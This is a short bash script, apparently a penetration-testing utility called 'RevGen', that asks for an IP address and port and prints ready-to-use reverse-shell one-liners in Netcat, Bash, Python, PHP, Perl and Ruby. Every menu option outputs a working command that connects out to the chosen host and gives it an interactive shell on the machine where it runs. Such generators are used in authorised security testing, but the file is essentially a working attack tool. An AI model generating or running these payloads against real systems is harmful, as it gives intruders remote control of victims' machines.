#!/bin/bash

yellow='tput setaf 3'
cyan='tput setaf 6'
green='tput setaf 2'
bold='tput bold'
reset='tput sgr0'
$bold; echo "	    ______           _____            "
echo "	    | ___ \         |  __ \           "
echo "	    | |_/ /_____   _| |  \/ ___ _ __  "
echo "	    |    // _ \ \ / / | __ / _ \ '_ \ "
echo "	    | |\ \  __/\ V /| |_\ \  __/ | | |"
echo "	    \_| \_\___| \_/  \____/\___|_| |_|"
echo ""
echo "This script generates a reverse shell in different languages"
echo ""
echo "##################By Simone Mallia#########################"
echo ""
$yellow; echo "Insert the ip address"; $reset
read ip
$bold; $yellow; echo "Insert the port"; $reset
read port
$bold; $yellow; echo "You want to generate the reverse shell in:"; $reset
$bold; $green; echo "1) Netcat"
echo "2) Bash"
echo "3) Python"
echo "4) PHP"
echo "5) Perl"
echo "6) Ruby"; $reset
while true; do

	read scelta
	case $scelta in
	1)
	$bold; $cyan; echo "1) nc -e /bin/sh $ip $port"
	echo "2) rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"; $reset
	break
	;;
	2)
	$bold; $cyan; echo "bash -i >& /dev/tcp/$ip/$port 0>&1"; $reset
	break
	;;
	3)
	$bold; $cyan; echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
	break
	;;
	4)
	$bold; $cyan; echo "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
	break
	;;
	5)
	$bold; $cyan; echo "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
	break
	;;
	6)
	$bold; $cyan; echo "ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
	break
	;;
	*)
	$bold; $cyan; echo "Invalid option. Try again"; $reset;;
	esac
done
